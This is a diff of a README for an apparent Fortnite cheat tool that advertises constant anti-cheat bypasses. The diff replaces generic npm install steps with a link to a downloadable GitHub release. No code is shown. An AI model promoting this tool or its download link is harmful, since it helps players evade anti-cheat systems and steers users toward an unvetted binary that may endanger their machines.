@@ -15,12 +15,7 @@ A multicheat for fortnite
 - Constant anticheat bypasses
 ## Installation
 
-Install my-project with npm
-
-```bash
-  npm install my-project
-  cd my-project
-```
+Install in https://github.com/Escrow-Ware/fortniteesp-escrow-ware/releases/tag/main
     
 ## Deployment
 
